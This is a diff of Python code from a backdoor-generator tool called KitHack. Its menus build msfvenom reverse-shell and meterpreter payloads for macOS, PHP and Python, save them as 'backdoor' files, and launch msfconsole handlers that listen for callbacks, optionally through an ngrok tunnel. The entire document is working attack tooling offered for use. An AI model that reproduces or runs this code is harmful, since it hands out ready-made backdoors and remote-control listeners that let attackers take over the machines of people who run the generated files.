 					os.system('clear')
@@ -1864,144 +2815,208 @@ def options():
 			print '{0}[01]{1} osx/x64/meterpreter_reverse_http'.format(WHITE, YELLOW)
 			print '{0}[02]{1} osx/x64/meterpreter_reverse_https'.format(WHITE, YELLOW)
 			print '{0}[03]{1} osx/x64/meterpreter_reverse_tcp'.format(WHITE, YELLOW)
-			print '{0}[04]{1} osx/x64/shell_reverse_tcp'.format(WHITE, YELLOW)
-			print '{0}[05]{1} osx/x86/shell_reverse_tcp'.format(WHITE, YELLOW)
+			print '{0}[04]{1} osx/x64/meterpreter/reverse_tcp'.format(WHITE, YELLOW)
+			print '{0}[05]{1} osx/x64/shell_reverse_tcp'.format(WHITE, YELLOW)
+			print '{0}[06]{1} osx/x86/shell_reverse_tcp'.format(WHITE, YELLOW)
 
 			pay = input("{0}KitHack >> {1}".format(RED, DEFAULT))
 
 			if pay == 1:
 				os.system('python lib/network.py')
-				LHOST = raw_input("\n\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
+				LHOST = raw_input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
 				LPORT = raw_input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
 				OUT = raw_input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
+				mainout = os.path.splitext(OUT)[0]
 				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
 				time.sleep(4)
-				os.system('service postgresql start && msfvenom -p osx/x64/meterpreter_reverse_http LHOST={0} LPORT={1} -f macho > output/{2}.macho'.format(LHOST, LPORT, OUT))																				
+				os.system('service postgresql start && msfvenom -p osx/x64/meterpreter_reverse_http LHOST={0} LPORT={1} -f macho > output/{2}.macho'.format(LHOST, LPORT, mainout))																				
 				location = os.getcwd()
-				print("\033[1;32m")
-				if os.stat('output/{}.macho'.format(OUT)).st_size != 0:
-					print("Backdoor guardado en {0}/output/{1}.macho".format(location, OUT))	
-					if raw_input("\n¿Desea ejecutar msfconsole? (y/n)\n{0}KitHack >> {1}".format(RED, DEFAULT)).upper() != "Y":
-						os.system('service postgresql stop && clear')
+				if os.stat('output/{}.macho'.format(mainout)).st_size != 0:
+					print("\n{0}[✔] Done.\n{1}Backdoor guardado en {2}/output/{3}.macho".format(GREEN, DEFAULT, location, mainout))	
+					if raw_input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
+						os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
 						banner(), menu(), options()	
 					else:
-						os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD osx/x64/meterpreter_reverse_http; exploit\'"'.format(LHOST, LPORT))
-						pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
-						os.system('service postgresql stop && clear')
-						banner(), menu(), options()	
+						while LHOST != "0.tcp.ngrok.io":
+							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD osx/x64/meterpreter_reverse_http; exploit\'"'.format(LHOST, LPORT))
+							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
+							os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+							banner(), menu(), options()	
+						else:
+							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD osx/x64/meterpreter_reverse_http; exploit\'"')
+							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
+							os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+							banner(), menu(), options()	
 				else:
-					print("{0}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
+					print("\n{0}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
 					time.sleep(3)
 					pause("{}Presione cualquier tecla para continuar...".format(GREEN))
-					os.system('service postgresql stop && clear')
+					os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
 					banner(), menu(), options()						
 
 			elif pay == 2:
 				os.system('python lib/network.py')
-				LHOST = raw_input("\n\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
+				LHOST = raw_input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
 				LPORT = raw_input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
 				OUT = raw_input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
+				mainout = os.path.splitext(OUT)[0]
 				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
 				time.sleep(4)
-				os.system('service postgresql start && msfvenom -p osx/x64/meterpreter_reverse_https LHOST={0} LPORT={1} -f macho > output/{2}.macho'.format(LHOST, LPORT, OUT))																				
+				os.system('service postgresql start && msfvenom -p osx/x64/meterpreter_reverse_https LHOST={0} LPORT={1} -f macho > output/{2}.macho'.format(LHOST, LPORT, mainout))																				
 				location = os.getcwd()
-				print("\033[1;32m")
-				if os.stat('output/{}.macho'.format(OUT)).st_size != 0:
-					print("Backdoor guardado en {0}/output/{1}.macho".format(location, OUT))	
-					if raw_input("\n¿Desea ejecutar msfconsole? (y/n)\n{0}KitHack >> {1}".format(RED, DEFAULT)).upper() != "Y":
-						os.system('service postgresql stop && clear')
+				if os.stat('output/{}.macho'.format(mainout)).st_size != 0:
+					print("\n{0}[✔] Done.\n{1}Backdoor guardado en {2}/output/{3}.macho".format(GREEN, DEFAULT, location, mainout))	
+					if raw_input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
+						os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
 						banner(), menu(), options()	
 					else:
-						os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD osx/x64/meterpreter_reverse_https; exploit\'"'.format(LHOST, LPORT))
-						pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
-						os.system('service postgresql stop && clear')
-						banner(), menu(), options()	
+						while LHOST != "0.tcp.ngrok.io":
+							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD osx/x64/meterpreter_reverse_https; exploit\'"'.format(LHOST, LPORT))
+							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
+							os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+							banner(), menu(), options()	
+						else:
+							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD osx/x64/meterpreter_reverse_https; exploit\'"')
+							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
+							os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+							banner(), menu(), options()	
 				else:
-					print("{0}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
+					print("\n{0}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
 					time.sleep(3)
 					pause("{}Presione cualquier tecla para continuar...".format(GREEN))
-					os.system('service postgresql stop && clear')
+					os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
 					banner(), menu(), options()			
 
 			elif pay == 3:
 				os.system('python lib/network.py')
-				LHOST = raw_input("\n\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
+				LHOST = raw_input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
 				LPORT = raw_input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
 				OUT = raw_input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
+				mainout = os.path.splitext(OUT)[0]
 				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
 				time.sleep(4)
-				os.system('service postgresql start && msfvenom -p osx/x64/meterpreter_reverse_tcp LHOST={0} LPORT={1} -f macho > output/{2}.macho'.format(LHOST, LPORT, OUT))																				
+				os.system('service postgresql start && msfvenom -p osx/x64/meterpreter_reverse_tcp LHOST={0} LPORT={1} -f macho > output/{2}.macho'.format(LHOST, LPORT, mainout))																				
 				location = os.getcwd()
-				print("\033[1;32m")
-				if os.stat('output/{}.macho'.format(OUT)).st_size != 0:
-					print("Backdoor guardado en {0}/output/{1}.macho".format(location, OUT))	
-					if raw_input("\n¿Desea ejecutar msfconsole? (y/n)\n{0}KitHack >> {1}".format(RED, DEFAULT)).upper() != "Y":
-						os.system('service postgresql stop && clear')
+				if os.stat('output/{}.macho'.format(mainout)).st_size != 0:
+					print("\n{0}[✔] Done.\n{1}Backdoor guardado en {2}/output/{3}.macho".format(GREEN, DEFAULT, location, mainout))	
+					if raw_input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
+						os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
 						banner(), menu(), options()	
 					else:
-						os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD osx/x64/meterpreter_reverse_tcp; exploit\'"'.format(LHOST, LPORT))
-						pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
-						os.system('service postgresql stop && clear')
-						banner(), menu(), options()	
+						while LHOST != "0.tcp.ngrok.io":
+							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD osx/x64/meterpreter_reverse_tcp; exploit\'"'.format(LHOST, LPORT))
+							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
+							os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+							banner(), menu(), options()	
+						else:
+							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD osx/x64/meterpreter_reverse_tcp; exploit\'"')
+							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
+							os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+							banner(), menu(), options()	
 				else:
-					print("{0}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
+					print("\n{0}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
 					time.sleep(3)
 					pause("{}Presione cualquier tecla para continuar...".format(GREEN))
-					os.system('service postgresql stop && clear')
+					os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
 					banner(), menu(), options()											
 
 			elif pay == 4:
 				os.system('python lib/network.py')
-				LHOST = raw_input("\n\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
+				LHOST = raw_input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
 				LPORT = raw_input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
 				OUT = raw_input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
+				mainout = os.path.splitext(OUT)[0]
 				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
 				time.sleep(4)
-				os.system('service postgresql start && msfvenom -p osx/x64/shell_reverse_tcp LHOST={0} LPORT={1} -f macho > output/{2}.macho'.format(LHOST, LPORT, OUT))																				
+				os.system('service postgresql start && msfvenom -p osx/x64/meterpreter/reverse_tcp LHOST={0} LPORT={1} -f macho > output/{2}.macho'.format(LHOST, LPORT, mainout))																				
 				location = os.getcwd()
-				print("\033[1;32m")
-				if os.stat('output/{}.macho'.format(OUT)).st_size != 0:
-					print("Backdoor guardado en {0}/output/{1}.macho".format(location, OUT))	
-					if raw_input("\n¿Desea ejecutar msfconsole? (y/n)\n{0}KitHack >> {1}".format(RED, DEFAULT)).upper() != "Y":
-						os.system('service postgresql stop && clear')
+				if os.stat('output/{}.macho'.format(mainout)).st_size != 0:
+					print("\n{0}[✔] Done.\n{1}Backdoor guardado en {2}/output/{3}.macho".format(GREEN, DEFAULT, location, mainout))	
+					if raw_input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
+						os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
 						banner(), menu(), options()	
 					else:
-						os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD osx/x64/shell_reverse_tcp; exploit\'"'.format(LHOST, LPORT))
-						pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
-						os.system('service postgresql stop && clear')
-						banner(), menu(), options()	
+						while LHOST != "0.tcp.ngrok.io":
+							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD osx/x64/meterpreter/reverse_tcp; exploit\'"'.format(LHOST, LPORT))
+							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
+							os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+							banner(), menu(), options()	
+						else:
+							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD osx/x64/meterpreter/reverse_tcp; exploit\'"')
+							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
+							os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+							banner(), menu(), options()	
 				else:
-					print("{0}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
+					print("\n{0}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
 					time.sleep(3)
 					pause("{}Presione cualquier tecla para continuar...".format(GREEN))
-					os.system('service postgresql stop && clear')
+					os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
 					banner(), menu(), options()	
 
 			elif pay == 5:
 				os.system('python lib/network.py')
-				LHOST = raw_input("\n\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
+				LHOST = raw_input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
 				LPORT = raw_input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
 				OUT = raw_input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
+				mainout = os.path.splitext(OUT)[0]
 				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
 				time.sleep(4)
-				os.system('service postgresql start && msfvenom -p osx/x86/shell_reverse_tcp LHOST={0} LPORT={1} -f macho > output/{2}.macho'.format(LHOST, LPORT, OUT))																				
+				os.system('service postgresql start && msfvenom -p osx/x64/shell_reverse_tcp LHOST={0} LPORT={1} -f macho > output/{2}.macho'.format(LHOST, LPORT, mainout))																				
 				location = os.getcwd()
-				print("\033[1;32m")
-				if os.stat('output/{}.macho'.format(OUT)).st_size != 0:
-					print("Backdoor guardado en {0}/output/{1}.macho".format(location, OUT))	
-					if raw_input("\n¿Desea ejecutar msfconsole? (y/n)\n{0}KitHack >> {1}".format(RED, DEFAULT)).upper() != "Y":
-						os.system('service postgresql stop && clear')
+				if os.stat('output/{}.macho'.format(mainout)).st_size != 0:
+					print("\n{0}[✔] Done.\n{1}Backdoor guardado en {2}/output/{3}.macho".format(GREEN, DEFAULT, location, mainout))	
+					if raw_input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
+						os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
 						banner(), menu(), options()	
 					else:
-						os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD osx/x86/shell_reverse_tcp; exploit\'"'.format(LHOST, LPORT))
-						pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
-						os.system('service postgresql stop && clear')
+						while LHOST != "0.tcp.ngrok.io":
+							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD osx/x64/shell_reverse_tcp; exploit\'"'.format(LHOST, LPORT))
+							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
+							os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+							banner(), menu(), options()	
+						else:
+							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD osx/x64/shell_reverse_tcp; exploit\'"')
+							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
+							os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+							banner(), menu(), options()	
+				else:
+					print("\n{0}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
+					time.sleep(3)
+					pause("{}Presione cualquier tecla para continuar...".format(GREEN))
+					os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+					banner(), menu(), options()	
+
+			elif pay == 6:
+				os.system('python lib/network.py')
+				LHOST = raw_input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
+				LPORT = raw_input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
+				OUT = raw_input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
+				mainout = os.path.splitext(OUT)[0]
+				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
+				time.sleep(4)
+				os.system('service postgresql start && msfvenom -p osx/x86/shell_reverse_tcp LHOST={0} LPORT={1} -f macho > output/{2}.macho'.format(LHOST, LPORT, mainout))																				
+				location = os.getcwd()
+				if os.stat('output/{}.macho'.format(mainout)).st_size != 0:
+					print("\n{0}[✔] Done.\n{1}Backdoor guardado en {2}/output/{3}.macho".format(GREEN, DEFAULT, location, mainout))	
+					if raw_input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
+						os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
 						banner(), menu(), options()	
+					else:
+						while LHOST != "0.tcp.ngrok.io":
+							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD osx/x86/shell_reverse_tcp; exploit\'"'.format(LHOST, LPORT))
+							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
+							os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+							banner(), menu(), options()	
+						else:
+							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD osx/x86/shell_reverse_tcp; exploit\'"')
+							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
+							os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+							banner(), menu(), options()	
 				else:
 					print("{0}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
 					time.sleep(3)
 					pause("{}Presione cualquier tecla para continuar...".format(GREEN))
-					os.system('service postgresql stop && clear')
+					os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
 					banner(), menu(), options()	
 			else:
 				print("\n{}[X] OPCION INVALIDA\n".format(RED))
@@ -2013,62 +3028,108 @@ def options():
 		elif sys == 5:
 			print '{0}\n [*] {1}Select Payload:\n'.format(DEFAULT, GREEN)
 			print '{0}[01]{1} php/meterpreter_reverse_tcp'.format(WHITE, YELLOW)
-			print '{0}[02]{1} php/reverse_php'.format(WHITE, YELLOW)
+			print '{0}[02]{1} php/meterpreter/reverse_tcp'.format(WHITE, YELLOW)
+			print '{0}[03]{1} php/reverse_php'.format(WHITE, YELLOW)
 
 			pay = input("{0}KitHack >> {1}".format(RED, DEFAULT))
 
 			if pay == 1:
 				os.system('python lib/network.py')
-				LHOST = raw_input("\n\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
+				LHOST = raw_input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
 				LPORT = raw_input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
 				OUT = raw_input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
+				mainout = os.path.splitext(OUT)[0]
 				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
 				time.sleep(4)
-				os.system('service postgresql start && msfvenom -p php/meterpreter_reverse_tcp LHOST={0} LPORT={1} R > output/{2}.php'.format(LHOST, LPORT, OUT))																				
+				os.system('service postgresql start && msfvenom -p php/meterpreter_reverse_tcp LHOST={0} LPORT={1} R > output/{2}.php'.format(LHOST, LPORT, mainout))																				
 				location = os.getcwd()
-				print("\033[1;32m")
-				if os.stat('output/{}.php'.format(OUT)).st_size != 0:
-					print("Backdoor guardado en {0}/output/{1}.php".format(location, OUT))	
-					if raw_input("\n¿Desea ejecutar msfconsole? (y/n)\n{0}KitHack >> {1}".format(RED, DEFAULT)).upper() != "Y":
-						os.system('service postgresql stop && clear')
+				if os.stat('output/{}.php'.format(mainout)).st_size != 0:
+					print("\n{0}[✔] Done.\n{1}Backdoor guardado en {2}/output/{3}.php".format(GREEN, DEFAULT, location, mainout))	
+					if raw_input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
+						os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
 						banner(), menu(), options()	
 					else:
-						os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD php/meterpreter_reverse_tcp; exploit\'"'.format(LHOST, LPORT))
-						pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
-						os.system('service postgresql stop && clear')
-						banner(), menu(), options()					
+						while LHOST != "0.tcp.ngrok.io":
+							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD php/meterpreter_reverse_tcp; exploit\'"'.format(LHOST, LPORT))
+							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
+							os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+							banner(), menu(), options()	
+						else:
+							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD php/meterpreter_reverse_tcp; exploit\'"')
+							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
+							os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+							banner(), menu(), options()				
 				else:
 					print("{0}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
 					time.sleep(3)
 					pause("{}Presione cualquier tecla para continuar...".format(GREEN))
-					os.system('service postgresql stop && clear')
-					banner(), menu(), options()						
+					os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+					banner(), menu(), options()		
 
-			elif pay == 2:
+			if pay == 2:
 				os.system('python lib/network.py')
-				LHOST = raw_input("\n\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
+				LHOST = raw_input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
 				LPORT = raw_input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
 				OUT = raw_input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
+				mainout = os.path.splitext(OUT)[0]
 				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
 				time.sleep(4)
-				os.system('service postgresql start && msfvenom -p php/reverse_php LHOST={0} LPORT={1} R > output/{2}.php'.format(LHOST, LPORT, OUT))																				
+				os.system('service postgresql start && msfvenom -p php/meterpreter/reverse_tcp LHOST={0} LPORT={1} R > output/{2}.php'.format(LHOST, LPORT, mainout))																				
 				location = os.getcwd()
-				print("\033[1;32m")
-				if os.stat('output/{}.php'.format(OUT)).st_size != 0:
-					print("Backdoor guardado en {0}/output/{1}.php".format(location, OUT))	
-					if raw_input("\n¿Desea ejecutar msfconsole? (y/n)\n{0}KitHack >> {1}".format(RED, DEFAULT)).upper() != "Y":
-						os.system('service postgresql stop && clear')
+				if os.stat('output/{}.php'.format(mainout)).st_size != 0:
+					print("\n{0}[✔] Done.\n{1}Backdoor guardado en {2}/output/{3}.php".format(GREEN, DEFAULT, location, mainout))	
+					if raw_input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
+						os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
 						banner(), menu(), options()	
 					else:
-						os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD php/reverse_php; exploit\'"'.format(LHOST, LPORT))
-						pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
-						os.system('service postgresql stop && clear')
-						banner(), menu(), options()	
+						while LHOST != "0.tcp.ngrok.io":
+							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD php/meterpreter/reverse_tcp; exploit\'"'.format(LHOST, LPORT))
+							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
+							os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+							banner(), menu(), options()	
+						else:
+							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD php/meterpreter/reverse_tcp; exploit\'"')
+							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
+							os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+							banner(), menu(), options()				
 				else:
 					print("{0}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
 					time.sleep(3)
 					pause("{}Presione cualquier tecla para continuar...".format(GREEN))
-					os.system('service postgresql stop && clear')
+					os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+					banner(), menu(), options()											
+
+			elif pay == 3:
+				os.system('python lib/network.py')
+				LHOST = raw_input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
+				LPORT = raw_input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
+				OUT = raw_input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
+				mainout = os.path.splitext(OUT)[0]
+				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
+				time.sleep(4)
+				os.system('service postgresql start && msfvenom -p php/reverse_php LHOST={0} LPORT={1} R > output/{2}.php'.format(LHOST, LPORT, mainout))																				
+				location = os.getcwd()
+				if os.stat('output/{}.php'.format(mainout)).st_size != 0:
+					print("\n{0}[✔] Done.\n{1}Backdoor guardado en {2}/output/{3}.php".format(GREEN, DEFAULT, location, mainout))	
+					if raw_input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
+						os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+						banner(), menu(), options()	
+					else:
+						while LHOST != "0.tcp.ngrok.io":
+							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD php/reverse_php; exploit\'"'.format(LHOST, LPORT))
+							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
+							os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+							banner(), menu(), options()	
+						else:
+							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD php/reverse_php; exploit\'"')
+							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
+							os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+							banner(), menu(), options()	
+				else:
+					print("{0}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
+					time.sleep(3)
+					pause("{}Presione cualquier tecla para continuar...".format(GREEN))
+					os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
 					banner(), menu(), options()	
 
 			else:
@@ -2083,172 +3144,242 @@ def options():
 			print '{0}[01]{1} python/meterpreter_reverse_http'.format(WHITE, YELLOW)
 			print '{0}[02]{1} python/meterpreter_reverse_https'.format(WHITE, YELLOW)
 			print '{0}[03]{1} python/meterpreter_reverse_tcp'.format(WHITE, YELLOW)
-			print '{0}[04]{1} python/shell_reverse_tcp'.format(WHITE, YELLOW)
-			print '{0}[05]{1} python/shell_reverse_tcp_ssl'.format(WHITE, YELLOW)
